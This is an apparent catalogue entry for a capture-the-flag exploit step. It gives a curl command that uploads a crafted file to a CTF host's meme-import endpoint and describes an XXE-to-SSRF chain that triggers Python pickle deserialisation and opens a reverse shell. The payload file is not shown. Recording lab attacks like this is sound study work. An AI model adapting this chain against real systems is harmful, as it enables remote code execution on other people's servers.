---
data: >-
  curl -X POST http://h1-5411.h1ctf.com/api/import_memes_2.0.php -F
  "f=@final_payload.memepak;type=application/octet-stream"
tags:
  - upload
  - xxe
  - rce
type: command
output: 'Triggers unpickling via SSRF, executes reverse shell'
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:49.992Z'
id: ec520ffd-b8b3-4d10-8d0d-cbf1554eb781
verified: false
validated: true
submitted: true
---
# upload-final-xxe-with-unpickling-payload

## Command

```bash
curl -X POST http://h1-5411.h1ctf.com/api/import_memes_2.0.php -F "f=@final_payload.memepak;type=application/octet-stream"
```

## Description

Uploads serialized ConfigFile with XXE XML embedding base64 pickle in /update-status?status=...&debug=1 for unpickling RCE.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| f | File with updated XXE payload | Yes |

## Examples

### Basic Usage

Similar to object injection upload but with pickle in status.

## Expected Output

Success; reverse shell executes on trigger.

## Related

- [[Related Procedure: Exploit-Python-Unpickling-in-Internal-Service]]
